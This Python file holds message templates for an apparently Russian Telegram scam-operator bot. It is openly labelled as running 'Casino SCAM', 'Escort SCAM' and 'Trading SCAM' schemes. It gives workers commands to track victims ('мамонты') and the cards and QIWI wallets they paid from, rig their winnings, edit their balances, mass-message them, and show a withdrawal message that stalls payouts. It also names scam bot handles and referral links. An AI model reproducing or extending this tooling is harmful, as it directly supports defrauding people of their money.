from aiogram.utils.emoji import emojize
from config import config

# casino info

casino_text = emojize(
    "🎰 <b>Казино</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    f"Мануалы - {config('reviews_link')}\n\n"
    "Скам боты - @olimprucasino_bot\n"
    f"Тех. поддержка - {config('casino_sup_username')}\n\n"
    "Твоя рефка фонбет - https://t.me/olimprucasino_bot?start={worker_id}\n\n"
    "Карты с которых вы пополняли:\n"
    "{pay_cards}\n"
    "QIWI с которых вы пополняли:\n"
    "{pay_qiwis}\n\n"
    "<b>ID мамонта</b> - Telegram ID или ID мамонта.\n\n"
    "/fdel <code>[ID Фразы]</code> - удалить фразу\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
    "/msg <code>[ID мамонта]</code>;<code>[Сообщение]</code> - сообщение от бота\n"
    "/bal <code>[ID мамонта]</code>;<code>[Баланс]</code> - изменить баланс мамонта\n"
    "/promo <code>[Сумма]</code>;<code>[Кол-во активаций]</code> (<i>необязательно</i>) - создать промокод\n\n"
    f"Запрещено использовать любые ТП кроме {config('casino_sup_username')}\n"
    "Запрещено принимать оплату на любые реквизиты кроме наших"
)


casino_msg_text = emojize(":full_moon: <b>Сообщение</b> было отправлено")

no_user_text = emojize(":warning: Не существует мамонта с этим ID")
no_mamonth_text = emojize(":warning: У вас нет мамонта с этим ID")
invalid_match_text = emojize(":warning: Неправильно введены данные.")

small_mamonth_info_text = "(/c{mid}) - &#127479;&#127482; <a href='tg://user?id={cid}'>{name}</a> - {balance} ₽, фарт - {fortune}"


no_mamonths_text = emojize(":slot_machine: <b>У тебя ещё нету мамонтов!</b>")

all_mamonths_text = emojize(
    ":slot_machine: <b>У тебя</b> {mamonths_count}:\n\n"
    "{all_mamonths}\n\n"
    "Обновлено в {time}"
)

casino_mamonth_info = emojize(
    "{smile} Мамонт с ID <b>c{uid}</b>\n\n"
    "Telegram ID: <b>{chat_id}</b>\n"
    "ID мамонта: <b>c{uid}</b>\n"
    "Имя: <a href='tg://user?id={chat_id}'>{name}</a>\n\n"
    "Баланс: <b>{balance}</b> ₽\n"
    "Валюта: <b>🇷🇺</b>\n"
    "Фарт: <b>{fortune}</b>\n"
    "Выигрышей: <b>{wins_count}</b>\n"
    "Пополнений: <b>{adds_count}</b>\n"
    "Проигрышей: <b>{lose_count}</b>\n"
    "Заявок на вывод: <b>0</b>\n"
    "Зачисленных пополнений: <b>1000</b> ₽\n"
    "Всего поднял на казино: <b>0</b> ₽\n\n"
    "Сообщение при выводе:\n"
    "<code>Введите свой QIWI кошелёк или карту\n\n"
    "Вывод возможен только на тот QIWI кошелек или карту с которой ваш баланс был пополнен впервые\n"
    "Для смены кошелька обратитесь в тех. поддержку</code>\n\n"
    "Обновлено в {time}"
)

fart_on_text = emojize(":full_moon: <b>Вы</b> включили фарт мамонту {name}")
fart_fif_text = emojize(
    ":full_moon::new_moon: <b>Вы</b> включили/выключили фарт мамонту {name}"
)
fart_off_text = emojize(":new_moon: <b>Вы</b> выключили фарт мамонту {name}")

mamonth_delete_text = emojize(":coffin: <b>Вы</b> удалили мамонта {name}")

cas_alert_text = emojize(
    ":woman_tipping_hand: Массовая рассылка сообщения всем вашим мамонтам\n"
    ":email: Введите сообщение для отправки\n\n"
    "Запрещено использовать любые ТП кроме @support, @support и @support\n"
    "Запрещено принимать оплату на любые реквизиты кроме наших"
)

cas_alsend_text = emojize(
    ":slot_machine: Рассылка была запущена\n"
    ":email: Текст рассылки:\n{text}\n\n"
    ":diamond_shape_with_a_dot_inside: Сообщение отправлено: {msg_count} / {msg_len}"
)


# escort info

escort_text = emojize(
    "💝 <b>Эскорт</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    "Скам бот - @btrflys_bot\n"
    f"Тех. поддержка - {config('escort_sup_username')}\n\n"
    "Твоя рефка - https://t.me/btrflys_bot?start={worker_id}\n"
    f"Мануалы - {config('reviews_link')}\n\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/msg <code>[ID мамонта]</code>;<code>[Сообщение]</code> - сообщение от бота\n"
)

# trading info

trading_text = emojize(
    "📈 <b>Трейдинг</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    "Скам бот - @rutradingbinance_bot\n"
    f"Тех. поддержка - {config('trading_sup_username')}\n\n"
    "Твоя рефка Binance - https://t.me/rutradingbinance_bot?start={worker_id}\n\n"
    "Карты с которых вы пополняли:\n"
    "{pay_cards}\n"
    "QIWI с которых вы пополняли:\n"
    "{pay_qiwis}\n\n"
    "/fdel <code>[ID фразы]</code> - удалить фразу\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
    "/msg <code>[ID мамонта]</code>; <code>[Сообщение]</code> - сообщение от бота\n"
    "/bal <code>[ID мамонта];</code> <code>[Баланс]</code> - изменить баланс мамонта\n"
    f"Запрещено использовать любые ТП кроме {config('trading_sup_username')}\n"
    "Запрещено принимать оплату на любые реквизиты кроме наших"
)
